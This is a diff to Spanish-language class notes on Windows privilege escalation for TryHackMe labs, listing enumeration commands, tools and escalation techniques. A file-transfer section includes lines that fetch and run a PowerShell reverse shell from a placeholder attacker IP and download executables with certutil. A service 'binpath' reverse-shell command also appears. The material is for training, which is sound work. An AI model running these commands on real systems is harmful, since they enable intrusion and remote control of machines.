@@ -991,39 +991,104 @@ Revisa los últimos 30 minutos de la clase para consolidar conceptos clave. Aseg
 
 # Notas de la Clase (23-01-2025)
 
-hacer la room de tryhackme de [https://tryhackme.com/r/room/windows10privesc](url)
+### Tema 7 - Local Users vs Domain Users
+- **Usuarios locales:** Creados y gestionados en la máquina local.
+- **Usuarios de dominio:** Gestionados en un servidor de dominio (Active Directory).
 
-hostname
-whoami
-whoami /priv
-syteminfo
-ipconfig
-cmdkey /list
+---
 
-Icacls <ruta>
+## Enumeración
 
-sc query windefend
+### Enumeración Manual
+- **Comandos útiles:**
+  - `hostname` - Nombre del host.
+  - `whoami` - Nombre del usuario actual.
+  - `whoami /priv` - Privilegios del usuario actual.
+  - `systeminfo` - Información del sistema.
+  - `ipconfig` - Configuración de red.
+  - `cmdkey /list` - Credenciales almacenadas.
+  - `icacls <ruta>` - Permisos sobre un archivo/carpeta.
+  - `sc query windefend` - Estado de un servicio.
+  - `schtasks /query /fo LIST /v` - Tareas programadas.
+  - `reg /query` - Consulta del registro.
 
-sc queryex type=service
+### Enumeración Automática
+- **Herramientas recomendadas:**
+  - **WinPEAS:** [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc)
+  - **Windows Exploit Suggester:** [Windows Privilege Escalation 2.0](https://tryhackme.com/room/windowsprivesc20) (Task 8).
+  - **PowerUP:** Herramienta de PowerShell para identificar vulnerabilidades.
+  - **BeRoot.exe:** Detección de configuraciones inseguras.
+  - **SeatBelt.exe:** Auditoría de configuraciones de seguridad en Windows.
 
-netsh advfirewall firewall dump
-Get-AppLockerPolicy -Effective | select - ExpandProperty RuleCollections
+---
 
-schtasks /query /fo LIST /v
+## Técnicas de Post-Explotación
 
-reg /query
+### Insecure Service Permissions
+- **Descripción:** Permisos inseguros en servicios permiten la escalada de privilegios.
+- **Ejemplo:** [Task 3 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).
 
+### Unquoted Service Path
+- **Descripción:** Una ruta de servicio sin comillas puede ejecutarse de forma maliciosa.
+- **Ejemplo:** [Task 4 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).
 
-Descargamos Peass en nuestra kali, y nos dan estos comandos para hacer el ejercicio para pasar el archivo al windows atacado. 
+### Insecure Service Executable
+- **Descripción:** Archivos ejecutables de servicio inseguros pueden ser reemplazados.
+- **Ejemplo:** [Task 6 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).
 
-     Target Windows:
-         curl -O http://[IP]/recurso
-         certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
-         powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
-         Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
-         powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
-         powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
-         copy \\IP\recurso
+### Passwords Saved Creds
+- **Descripción:** Recuperación de contraseñas guardadas en el sistema.
+- **Ejemplo:** [Task 10 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).
 
-Nos explica el profesor winPeass su funcionamiento el windows ya que linux lo sabemos.
+### Scheduled Tasks
+- **Descripción:** Tareas programadas mal configuradas permiten la escalada de privilegios.
+- **Ejemplo:** [Task 13 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).
 
+### Mimikatz
+- **Descripción:** Herramienta para extraer credenciales de memoria y otros datos sensibles.
+- **Ejemplo:** [Task 4 - Post Exploitation](https://tryhackme.com/room/postexploit).
+
+### Persistence
+- **Descripción:** Métodos para mantener el acceso en el sistema.
+- **Ejemplo:** [Task 7 - Post Exploitation](https://tryhackme.com/room/postexploit).
+
+---
+
+## Transferencia de Archivos
+
+Para descargar archivos en la máquina comprometida desde tu máquina Kali:
+
+```bash
+# Windows
+curl -O http://[IP]/recurso
+certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
+powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+copy \\IP\recurso
+```
+
+### Ejemplo: Uso de WinPEAS
+1. Descarga **WinPEAS** en Kali.
+2. Transfiere el archivo a la máquina comprometida utilizando alguno de los comandos anteriores.
+3. Ejecuta **WinPEAS** para identificar vulnerabilidades automáticamente.
+
+---
+
+## Exploits en Servicios
+
+### Service Exploits - Insecure Service Permissions
+- **Comando:** `sc config [Servicio] binpath= "cmd.exe /c reverse_shell"`.
+- Sigue el ejemplo en la room de TryHackMe: [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc).
+
+### Service Exploits - Unquoted Service Path
+- **Descripción:** Aprovecha rutas de servicio no citadas.
+- Repite los pasos de la room de TryHackMe: [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc).
+
+---
+
+## Tareas
+
+- Completar la room: [Windows 10 Privilege Escalation](https://tryhackme.com/r/room/windows10privesc).
+- Revisar el video de la clase si es necesario.
